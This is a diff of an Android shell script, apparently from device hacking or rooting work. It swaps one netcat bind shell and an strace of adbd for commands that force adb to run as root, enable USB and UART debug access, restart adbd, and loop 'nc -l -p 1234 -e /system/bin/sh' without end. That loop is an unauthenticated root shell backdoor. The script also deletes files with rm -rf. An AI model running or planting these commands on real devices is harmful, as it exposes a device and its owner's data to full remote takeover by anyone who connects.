@@ -1,7 +1,15 @@
 /system/xbin/busybox touch /tmp/RedHerring.$$
 /system/xbin/busybox touch /data/InYourGrill.$$
-/system/xbin/busybox nc -l -p 1234 -e /system/bin/sh &
 rm -rf /data/.bin/grep 
-strace -s2000 -o /data/adb_trace -vvvff /sbin/adbd
+
+echo RedHerring > /sys/class/android_usb/android0/iSerial
+setprop service.adb.root 1
+setprop service.adb.tcp.port -1
+setprop sys.usb.config rndis,mass_storage,bulk,acm,adb
+busybox devmem 0xe10093d0 8 0x40    #enable uart
+sleep 1
+/sbin/adbd&
+while true; do /system/xbin/busybox nc -l -p 1234 -e /system/bin/sh & done 
+
 
 
